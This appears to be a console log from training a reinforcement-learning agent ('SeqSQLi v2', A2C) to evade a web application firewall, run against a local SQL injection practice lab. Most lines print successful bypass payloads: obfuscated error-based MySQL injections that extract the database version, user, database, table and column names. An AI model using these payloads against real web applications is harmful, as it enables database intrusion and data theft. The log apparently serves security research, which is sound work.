/home/neet/.pyenv/versions/3.13.12/lib/python3.13/site-packages/stable_baselines3/common/on_policy_algorithm.py:150: UserWarning: You are trying to run A2C on the GPU, but it is primarily intended to run on the CPU when not using a CNN policy (you are using ActorCriticPolicy which should be a MlpPolicy). See https://github.com/DLR-RM/stable-baselines3/issues/1245 for more info. You can pass `device='cpu'` or `export CUDA_VISIBLE_DEVICES=` to force using the CPU.Note: The model will train, but the GPU utilization will be poor and the training might take longer than on CPU.
  warnings.warn(
============================================================
 SeqSQLi v2 — A2C Training
 URL         : http://localhost:8080/Less-1/
 Filter type : none
 Mode        : online-WAF (dual-signal: union+error)
 Payload pool: 108 validated from payloads_error_less1.csv
               (union=0, error=108)
 Timesteps   : 150000
 Rollout     : n_steps=5 (synchronous A3C variant)
 Seed        : 3
============================================================
  Ep   10 | SR=0% | Steps=15.0 | R=-46.00
           payload: 1'%0aaND%0aEXP(~(seleCt%0a*%0afrom%0a(selECT%0a(DAtABASE%a0()))a));%00
  Ep 5940 | SR=40% | Steps=11.2 | R=-18.09
  [BYPASS] Ep 5944 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 5948 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 5949 | steps=6 | seq=case -> hex_to_char -> agg_swap -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aanD%0aEXP(~(sElEcT%0a*%0afroM%0a(SeLecT%0a((SELeCT%0acoNcat(CHAR(124),JSON_ARRAYAGG(taBle_name),CHAR(124))%0aFrom%0ainfORMaTion_ScheMA.taBLEs%0aw
  Ep 5950 | SR=30% | Steps=11.7 | R=-22.50
  [BYPASS] Ep 5959 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnd%0aEXP(~(SelECt%0a*%0afRoM%0a(SElECt%0a(version%a0()))a));%00
  Ep 5960 | SR=10% | Steps=14.0 | R=-29.08
  [BYPASS] Ep 5965 | steps=4 | seq=agg_swap -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 5966 | steps=5 | seq=agg_swap -> null_byte -> newline -> func_sp_nbsp -> case
           payload: 1'%0aanD%0aEXP(~(selEct%0a*%0afroM%0a(selEcT%0a(user%a0()))a));%00
  [BYPASS] Ep 5968 | steps=6 | seq=case -> hex_to_char -> agg_swap -> agg_swap -> null_byte -> newline
           payload: 1'%0aanD%0aEXP(~(SeLeCt%0a*%0afRom%0a(SELeCt%0a((selEcT%0aJSON_ARRAYAGG(CONCAT(TABLe_schema,CHAR(46),taBlE_name))%0aFrom%0aInFOrmaTiON_sChEMa.TABlEs%0
  Ep 5970 | SR=30% | Steps=12.0 | R=-21.71
  [BYPASS] Ep 5973 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 5974 | steps=5 | seq=agg_swap -> null_byte -> newline -> func_sp_nbsp -> case
           payload: 1'%0aAND%0aEXP(~(sELecT%0a*%0aFRoM%0a(seLect%0a(version%a0()))a));%00
  Ep 5980 | SR=20% | Steps=12.8 | R=-25.05
  [BYPASS] Ep 5981 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 5983 | steps=6 | seq=case -> hex_to_char -> agg_swap -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(sElEcT%0a*%0afrOm%0a(sELeCt%0a((sElecT%0aCOnCAT(CHAR(124),JSON_ARRAYAGG(tAbLE_name),CHAR(124))%0aFRom%0aiNFormATion_ScheMa.TABles%0aW
  [BYPASS] Ep 5989 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  Ep 5990 | SR=30% | Steps=11.7 | R=-23.06
  [BYPASS] Ep 5991 | steps=5 | seq=case -> hex_to_char -> agg_swap -> null_byte -> newline
           payload: 1'%0aAND%0aEXP(~(SElEct%0a*%0aFrOm%0a(seleCt%0a((seLect%0aJSON_ARRAYAGG(CONCAT(taBLE_schema,CHAR(46),tABLE_name))%0afRoM%0aInFORmaTiON_SChEMa.tables%0
  [BYPASS] Ep 5997 | steps=5 | seq=agg_swap -> null_byte -> newline -> func_sp_nbsp -> case
           payload: 1'%0aaND%0aEXP(~(sEleCt%0a*%0aFrOm%0a(SelecT%0a(user%a0()))a));%00
  [BYPASS] Ep 5998 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  Ep 6000 | SR=30% | Steps=11.8 | R=-17.63
  [BYPASS] Ep 6006 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  Ep 6010 | SR=10% | Steps=13.8 | R=-30.26
  [BYPASS] Ep 6013 | steps=5 | seq=agg_swap -> null_byte -> newline -> func_sp_nbsp -> case
           payload: 1'%0aAND%0aEXP(~(SelEct%0a*%0afroM%0a(SeleCT%0a((sELEcT%0aJSON_ARRAYAGG(column_name)%0afrom%0ainfORMatioN_scheMA.columns%0aWhERe%0atABle_schema=dATABA
  [BYPASS] Ep 6015 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnD%0aEXP(~(SEleCT%0a*%0aFRoM%0a(sEleCT%0a(version%a0()))a));%00
  Ep 6020 | SR=20% | Steps=13.0 | R=-25.52
  [BYPASS] Ep 6028 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 6029 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aEXP(~(seleCT%0a*%0afrOm%0a(selECt%0a(datABAse%a0()))a));%00
  Ep 6030 | SR=20% | Steps=12.7 | R=-23.23
  [BYPASS] Ep 6032 | steps=7 | seq=case -> case -> hex_to_char -> agg_swap -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnd%0aEXP(~(SElect%0a*%0aFrOM%0a(SeLeCt%0a((SElecT%0acOncat(CHAR(124),JSON_ARRAYAGG(taBLE_name),CHAR(124))%0aFrOM%0aInfOrmAtIoN_schEma.tABlEs%0aW
  [BYPASS] Ep 6034 | steps=5 | seq=agg_swap -> null_byte -> newline -> func_sp_nbsp -> case
           payload: 1'%0aaNd%0aEXP(~(SelEct%0a*%0afrOM%0a(SeLEct%0a((selEct%0aJSON_ARRAYAGG(schema_name)%0aFROm%0aInFORMAtioN_schema.schemata)))a));%00
  [BYPASS] Ep 6035 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 6040 | steps=5 | seq=case -> hex_to_char -> agg_swap -> null_byte -> newline
           payload: 1'%0aaNd%0aEXP(~(sElECt%0a*%0aFRom%0a(seleCt%0a((SElEct%0aJSON_ARRAYAGG(CONCAT(TaBlE_schema,CHAR(46),TaBle_name))%0afRoM%0ainFoRMATioN_sCHEmA.TAbles%0
  Ep 6040 | SR=40% | Steps=11.0 | R=-17.79
  [BYPASS] Ep 6042 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 6046 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  Ep 6050 | SR=20% | Steps=12.6 | R=-22.52
  [BYPASS] Ep 6053 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aaND%0aEXP(~(SELecT%0a*%0afRom%0a(selECT%0a((sElect%0aJSON_ARRAYAGG(CoNcat(TAble_schema,CHAR(46),TABLe_name))%0afrOm%0aINFormatIon_ScheMa.taBLes%0
  [BYPASS] Ep 6059 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aand%0aEXP(~(SElECT%0a*%0aFrOM%0a(SeLEct%0a(daTABaSe%a0()))a));%00
  Ep 6060 | SR=20% | Steps=13.1 | R=-26.72
  [BYPASS] Ep 6069 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnD%0aEXP(~(SeleCT%0a*%0aFrOm%0a(SelecT%0a((SeLeCt%0acoNcAt(CHAR(124),JSON_ARRAYAGG(TaBLe_name),CHAR(124))%0aFrom%0aiNfOrmatioN_ScheMA.tAbLes%0aw
  Ep 6070 | SR=10% | Steps=14.2 | R=-29.60
  [BYPASS] Ep 6071 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(SeleCT%0a*%0aFROM%0a(SELecT%0a((selECt%0aCoNCAt(CHAR(124),JSON_ARRAYAGG(tAbLe_name),CHAR(124))%0afrOm%0aInForMaTIOn_sChemA.taBLEs%0aW
  [BYPASS] Ep 6073 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(SELecT%0a*%0afROM%0a(selecT%0a(dAtABaSE%a0()))a));%00
  [BYPASS] Ep 6076 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(SELect%0a*%0aFrom%0a(sElECt%0a(user%a0()))a));%00
  [BYPASS] Ep 6079 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaND%0aEXP(~(sElecT%0a*%0aFrOm%0a(sEleCt%0a(version%a0()))a));%00
  Ep 6080 | SR=40% | Steps=11.1 | R=-17.54
  [BYPASS] Ep 6082 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aand%0aEXP(~(SeLeCt%0a*%0aFROm%0a(SeLEcT%0a(version%a0()))a));%00
  [BYPASS] Ep 6087 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 6088 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aanD%0aEXP(~(seLect%0a*%0aFROM%0a(sElEcT%0a((SEleCT%0acONCAT(CHAR(124),JSON_ARRAYAGG(TABlE_name),CHAR(124))%0aFRom%0aInForMation_SChEma.tables%0aW
  [BYPASS] Ep 6090 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aEXP(~(sELEct%0a*%0aFrOM%0a(seLEcT%0a(DAtaBasE%a0()))a));%00
  Ep 6090 | SR=40% | Steps=10.8 | R=-16.80
  [BYPASS] Ep 6094 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aanD%0aEXP(~(selECt%0a*%0aFrom%0a(seLECt%0a((SelECt%0aJSON_ARRAYAGG(cOncaT(taBLE_schema,CHAR(46),TABle_name))%0afROM%0aiNFORmATIon_SchEMa.TabLes%0
  [BYPASS] Ep 6097 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aand%0aEXP(~(SeleCT%0a*%0afrOM%0a(sELeCT%0a(DATABaSE%a0()))a));%00
  Ep 6100 | SR=20% | Steps=13.0 | R=-25.69
  [BYPASS] Ep 6101 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aEXP(~(sEleCt%0a*%0aFrOm%0a(SeLEct%0a(version%a0()))a));%00
  [BYPASS] Ep 6107 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 6109 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnd%0aEXP(~(SELeCT%0a*%0afrOm%0a(selEcT%0a(version%a0()))a));%00
  Ep 6110 | SR=30% | Steps=11.6 | R=-20.18
  [BYPASS] Ep 6111 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 6120 | SR=10% | Steps=13.8 | R=-30.94
  [BYPASS] Ep 6124 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aaND%0aEXP(~(SeLeCt%0a*%0aFrOm%0a(SELeCT%0a((sELeCT%0aJSON_ARRAYAGG(COnCaT(Table_schema,CHAR(46),tAbLe_name))%0aFRoM%0aiNFoRMATion_scHEmA.TAblEs%0
  [BYPASS] Ep 6127 | steps=8 | seq=case -> case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(SelEcT%0a*%0aFROM%0a(SElECT%0a((sEleCT%0aConCAT(CHAR(124),JSON_ARRAYAGG(TaBle_name),CHAR(124))%0aFrOm%0aINFORmATioN_schemA.tablEs%0aW
  Ep 6130 | SR=20% | Steps=13.4 | R=-27.61
  [BYPASS] Ep 6136 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 6137 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnd%0aEXP(~(SeLEct%0a*%0aFROM%0a(seLeCT%0a(user%a0()))a));%00
  [BYPASS] Ep 6139 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  Ep 6140 | SR=30% | Steps=11.5 | R=-21.83
  [BYPASS] Ep 6148 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaND%0aEXP(~(sElECt%0a*%0afroM%0a(SELeCt%0a(DAtAbaSE%a0()))a));%00
  Ep 6150 | SR=10% | Steps=13.9 | R=-29.62
  [BYPASS] Ep 6151 | steps=6 | seq=case -> hex_to_char -> agg_swap -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnD%0aEXP(~(seLEcT%0a*%0aFroM%0a(SeLecT%0a((SeLECt%0aCoNCaT(CHAR(124),JSON_ARRAYAGG(tAbLe_name),CHAR(124))%0afrom%0aINfORmatIoN_schemA.TabLes%0aW
  Ep 6160 | SR=10% | Steps=14.1 | R=-31.93
  [BYPASS] Ep 6161 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 6163 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaND%0aEXP(~(SeLeCt%0a*%0aFRoM%0a(SeLECT%0a(version%a0()))a));%00
  [BYPASS] Ep 6164 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aand%0aEXP(~(SEleCT%0a*%0afROm%0a(SELECt%0a(dAtabAsE%a0()))a));%00
  [BYPASS] Ep 6165 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aand%0aGTID_SUBSET((version%a0()),1);%00
  Ep 6170 | SR=40% | Steps=10.5 | R=-16.60
  Ep 6180 | SR=0% | Steps=15.0 | R=-34.58
  [BYPASS] Ep 6190 | steps=4 | seq=agg_swap -> case -> null_byte -> newline
           payload: 1'%0aAND%0aEXP(~(sELECT%0a*%0afRom%0a(seLECT%0a((SEleCT%0aJSON_ARRAYAGG(schema_name)%0afRoM%0aiNforMAtIoN_scHema.schemata)))a));%00
  Ep 6190 | SR=10% | Steps=13.9 | R=-31.01
  [BYPASS] Ep 6191 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aanD%0aEXP(~(selEcT%0a*%0afRom%0a(sELect%0a((SelecT%0aCONcaT(CHAR(124),JSON_ARRAYAGG(TaBLe_name),CHAR(124))%0aFRom%0aInforMatIOn_ScHEMa.tAbles%0aW
  [BYPASS] Ep 6198 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aAnd%0aEXP(~(sElEcT%0a*%0afrOM%0a(sElECT%0a((seLeCT%0aJSON_ARRAYAGG(conCAT(tABle_schema,CHAR(46),TaBle_name))%0afroM%0aINFoRMaTION_SCheMA.TaBLEs%0
  Ep 6200 | SR=20% | Steps=13.3 | R=-25.94
  [BYPASS] Ep 6203 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aanD%0aEXP(~(selEcT%0a*%0afRoM%0a(seLect%0a(dAtabase%a0()))a));%00
  [BYPASS] Ep 6205 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aEXP(~(sElEcT%0a*%0afROM%0a(selEct%0a(version%a0()))a));%00
  [BYPASS] Ep 6206 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 6208 | steps=4 | seq=null_byte -> newline -> func_sp_nbsp -> case
           payload: 1'%0aANd%0aEXP(~(sElEcT%0a*%0aFrOm%0a(selecT%0a(DATabAsE%a0()))a));%00
  Ep 6210 | SR=40% | Steps=10.6 | R=-18.40
  [BYPASS] Ep 6215 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 6217 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  Ep 6220 | SR=20% | Steps=12.6 | R=-27.05
  [BYPASS] Ep 6225 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  Ep 6230 | SR=10% | Steps=13.8 | R=-30.42
  [BYPASS] Ep 6232 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(sELeCT%0a*%0afRom%0a(SelECt%0a(DaTabaSe%a0()))a));%00
  [BYPASS] Ep 6233 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aand%0aGTID_SUBSET((version%a0()),1);%00
  Ep 6240 | SR=20% | Steps=12.8 | R=-26.76
  [BYPASS] Ep 6241 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(SelecT%0a*%0afRoM%0a(SelecT%0a(DaTAbAse%a0()))a));%00
  [BYPASS] Ep 6250 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaND%0aEXP(~(seLeCT%0a*%0aFROm%0a(SELeCt%0a(version%a0()))a));%00
  Ep 6250 | SR=20% | Steps=12.8 | R=-25.11
  [BYPASS] Ep 6252 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnD%0aEXP(~(SelECt%0a*%0aFROm%0a(sEleCT%0a(user%a0()))a));%00
  [BYPASS] Ep 6259 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aaND%0aEXP(~(sElECT%0a*%0aFROM%0a(seLEct%0a((selEcT%0aJSON_ARRAYAGG(cOncAT(tabLe_schema,CHAR(46),TABlE_name))%0aFRom%0aInfoRmATion_SCHeMA.taBles%0
  Ep 6260 | SR=20% | Steps=13.0 | R=-26.98
  [BYPASS] Ep 6261 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aanD%0aEXP(~(SeLECt%0a*%0aFroM%0a(seleCt%0a((SeleCT%0acoNcAT(CHAR(124),JSON_ARRAYAGG(taBLE_name),CHAR(124))%0aFrOM%0aiNfORMatiON_scHeMA.TaBlEs%0aW
  [BYPASS] Ep 6263 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(SeLECt%0a*%0afrom%0a(sELeCt%0a((sElEct%0aconcaT(CHAR(124),JSON_ARRAYAGG(taBle_name),CHAR(124))%0aFrOM%0aInFORmATiOn_ScHeMA.TaBlEs%0aw
  [BYPASS] Ep 6264 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aand%0aEXP(~(sELECT%0a*%0afROm%0a(SElecT%0a((sElect%0acoNcAt(CHAR(124),JSON_ARRAYAGG(TabLE_name),CHAR(124))%0afRom%0ainFOrMatION_SCHEMa.tABLes%0aW
  Ep 6270 | SR=30% | Steps=12.6 | R=-21.23
  [BYPASS] Ep 6271 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnd%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 6278 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnd%0aEXP(~(SeLect%0a*%0afroM%0a(sElect%0a((selECT%0aCOncaT(CHAR(124),JSON_ARRAYAGG(TabLE_name),CHAR(124))%0aFroM%0aInFORMatION_SCHema.TABlEs%0aw
  Ep 6280 | SR=20% | Steps=13.1 | R=-25.48
  [BYPASS] Ep 6284 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(SeLect%0a*%0aFroM%0a(seLeCT%0a(user%a0()))a));%00
  [BYPASS] Ep 6286 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  Ep 6290 | SR=20% | Steps=12.7 | R=-24.90
  [BYPASS] Ep 6297 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aanD%0aEXP(~(sELeCt%0a*%0afroM%0a(SeLect%0a((SeLECt%0aconcAt(CHAR(124),JSON_ARRAYAGG(TablE_name),CHAR(124))%0aFRoM%0ainFormatIOn_SCHEma.TablEs%0aw
  Ep 6300 | SR=10% | Steps=14.2 | R=-31.44
  [BYPASS] Ep 6302 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 6304 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnD%0aEXP(~(SElecT%0a*%0afROM%0a(seLEct%0a(version%a0()))a));%00
  [BYPASS] Ep 6310 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 6310 | SR=30% | Steps=11.5 | R=-22.81
  [BYPASS] Ep 6312 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 6318 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  Ep 6320 | SR=20% | Steps=12.6 | R=-26.36
  Ep 6330 | SR=0% | Steps=15.0 | R=-34.56
  [BYPASS] Ep 6332 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 6333 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aEXP(~(sELecT%0a*%0aFRoM%0a(SelecT%0a(version%a0()))a));%00
  [BYPASS] Ep 6337 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(selEct%0a*%0afRoM%0a(SElect%0a(user%a0()))a));%00
  Ep 6340 | SR=30% | Steps=11.6 | R=-22.44
  [BYPASS] Ep 6341 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnD%0aEXP(~(SElect%0a*%0afRom%0a(SELECt%0a(DataBAsE%a0()))a));%00
  [BYPASS] Ep 6347 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 6348 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  Ep 6350 | SR=30% | Steps=11.5 | R=-21.11
  [BYPASS] Ep 6359 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aand%0aEXP(~(seLeCT%0a*%0aFrom%0a(SELEct%0a(user%a0()))a));%00
  Ep 6360 | SR=10% | Steps=13.9 | R=-29.05
  [BYPASS] Ep 6363 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaND%0aEXP(~(SELECt%0a*%0afRoM%0a(selEcT%0a((seleCT%0aconcaT(CHAR(124),JSON_ARRAYAGG(TaBle_name),CHAR(124))%0afRom%0aiNfORmATioN_SchEmA.TABLEs%0aw
  [BYPASS] Ep 6367 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aAND%0aEXP(~(selECt%0a*%0aFRom%0a(sElEcT%0a((SeLeCT%0aJSON_ARRAYAGG(CONCAT(tAbLE_schema,CHAR(46),tablE_name))%0aFrOm%0aINformatIon_SCheMA.tABlEs%0
  [BYPASS] Ep 6370 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aEXP(~(selEct%0a*%0aFroM%0a(selEct%0a(user%a0()))a));%00
  Ep 6370 | SR=30% | Steps=12.2 | R=-23.16
  Ep 6380 | SR=0% | Steps=15.0 | R=-31.80
  [BYPASS] Ep 6381 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aand%0aEXP(~(selEct%0a*%0aFrOM%0a(SEleCT%0a((selECt%0aCoNcat(CHAR(124),JSON_ARRAYAGG(TAblE_name),CHAR(124))%0aFROm%0aINfOrMaTIon_scHeMa.TABles%0aw
  [BYPASS] Ep 6387 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aanD%0aEXP(~(SelECt%0a*%0afRoM%0a(SeLeCt%0a(DaTABASE%a0()))a));%00
  Ep 6390 | SR=20% | Steps=13.1 | R=-27.49
  [BYPASS] Ep 6394 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 6400 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 6400 | SR=20% | Steps=12.6 | R=-26.74
  [BYPASS] Ep 6409 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aaND%0aEXP(~(sELECT%0a*%0aFrom%0a(sElECt%0a((sElEct%0aJSON_ARRAYAGG(concat(TabLE_schema,CHAR(46),TabLe_name))%0afrOm%0aInFOrMATiON_SChEma.TAbLEs%0
  Ep 6410 | SR=10% | Steps=14.1 | R=-29.35
